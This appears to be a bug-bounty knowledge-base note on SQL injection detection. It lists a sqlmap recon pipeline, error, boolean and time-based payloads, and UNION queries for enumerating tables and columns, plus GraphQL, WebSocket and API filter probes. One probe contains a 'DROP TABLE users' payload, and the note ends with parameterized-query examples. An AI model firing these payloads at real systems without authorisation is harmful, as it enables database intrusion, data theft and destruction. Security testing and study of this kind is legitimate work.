---
title: "SQL Injection Testing & Database Exploitation Frameworks: Detection Methodology & Probing"
created: 2026-09-29
updated: 2026-09-29
type: concept
parent: "[[sql-injection-testing]]"
cluster: web-and-bug-bounty
tags:
  - sqli
  - bug-bounty
  - payload
sources:
  - unprocessed-obsidians/sql-injection.md
confidence: high
contested: false
contradictions: []
---
# SQL Injection Testing & Database Exploitation Frameworks: Detection Methodology & Probing


<!-- TOC_START -->
## Table of Contents
- [Hunt](#hunt)
  - [Recon Workflow](#recon-workflow)
  - [Identification Techniques](#identification-techniques)
    - [Parameter Testing](#parameter-testing)
    - [Error-Based Detection](#error-based-detection)
    - [Blind Detection](#blind-detection)
  - [Advanced Testing Approaches](#advanced-testing-approaches)
    - [Mapping Database Structure](#mapping-database-structure)
- [Related Pages](#related-pages)
<!-- TOC_END -->

## Hunt

### Recon Workflow

- Using Burpsuite:
  - Capture request in Burpsuite
  - Send to active scanner
  - Review SQL vulnerabilities detected
  - Manually verify findings
  - Use SQLMAP for deeper exploitation
- Using automation tools:
  - sublist3r -d target | tee -a domains
  - cat domains | httpx | tee -a alive
  - cat alive | waybackurls | tee -a urls
  - gf sqli urls >> sqli
  - sqlmap -m sqli --dbs --batch
- Hidden parameter discovery:
  - Gather URLs using hakrawler/waybackurls/gau
  - Use Arjun to scan for hidden parameters
  - Test discovered parameters for SQL injection

### Identification Techniques

#### Parameter Testing

- Test all input vectors: URL parameters, form fields, cookies, HTTP headers
- Insert basic SQL syntax characters to provoke errors:
  ```
  ' " ; -- /* */ # ) ( + ,
  ```
- Test single and double quote placement in different contexts:
  ```
  ' OR '1'='1
  " OR "1"="1
  ```
- Use SQLi polyglots (work in multiple contexts):
  ```
  SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
  ```

#### Error-Based Detection

- Look for database error messages that reveal:
  - SQL syntax errors
  - Database type and version
  - Table/column names
  - Query structure
- Common error-triggering payloads:
  ```
  '
  ''
  `
  "
  ""
  ,
  %
  \
  ```

#### Blind Detection

- Boolean-based tests (observe differences in responses):
  ```sql
  ' OR 1=1 --
  ' OR 1=2 --
  ' AND 1=1 --
  ' AND 1=2 --
  ```
- Time-based tests (observe response timing):

  ```sql
  MySQL: ' OR SLEEP(5) --
  PostgreSQL: ' OR pg_sleep(5) --
  MSSQL: ' WAITFOR DELAY '0:0:5' --
  Oracle: '; BEGIN DBMS_LOCK.SLEEP(5); END; --

  ```

- JSON operator probes (MySQL/Postgres):

  ```sql
  # MySQL JSON
  id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1
  # Postgres JSONB
  id=1 AND '{"a":1}'::jsonb ? 'a'
  ```

### Advanced Testing Approaches

#### Mapping Database Structure

1. Determine database type:

   ```sql
   ' UNION SELECT @@version -- (MySQL/MSSQL)
   ' UNION SELECT version() -- (PostgreSQL)
   ' UNION SELECT banner FROM v$version -- (Oracle)
   ```

2. Enumerate tables:

   ```sql
   # MySQL/MSSQL
   ' UNION SELECT table_name,1 FROM information_schema.tables --

   # PostgreSQL
   ' UNION SELECT table_name,1 FROM information_schema.tables --

   # Oracle
   ' UNION SELECT table_name,1 FROM all_tables --
   ```

3. Enumerate columns:

   ```sql
   # MySQL/MSSQL/PostgreSQL
   ' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' --

   # Oracle
   ' UNION SELECT column_name,1 FROM all_tab_columns WHERE table_name='USERS' --
   ```

4. GraphQL → SQLi pivot

```
# Try introspection disabled? Send crafted filter/order inputs
{"query":"query{ users(filter: \"' OR 1=1 --\"){ id email }}"}
```

5. WebSocket SQLi detection

```javascript
// Connect to WebSocket endpoint
const ws = new WebSocket("wss://target.com/api/search");
ws.send('{"action":"search","query":"test\\\' OR 1=1--"}');
// Observe response for SQL errors or data leakage
```

6. REST API Filter Injection

```json
// Modern APIs often accept complex filters
POST /api/users/search
{
  "filter": {
    "name": {"$regex": "admin' OR 1=1--"},
    "status": "active"
  },
  "sort": "name'; DROP TABLE users--"
}
```

7. ORM/Query Builder pitfalls (examples)

```
// Sequelize (Node): avoid string concatenation; use replacements/bind
sequelize.query('SELECT * FROM users WHERE name = :name', { replacements: { name: user }, type: QueryTypes.SELECT })

// Prisma (Node): prefer parameterized $queryRaw vs $executeRawUnsafe
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${user}`

// Knex
knex('users').whereRaw('name = ?', [user])
```


## Related Pages
- [[sql-injection-testing]]
- [[web-and-bug-bounty]]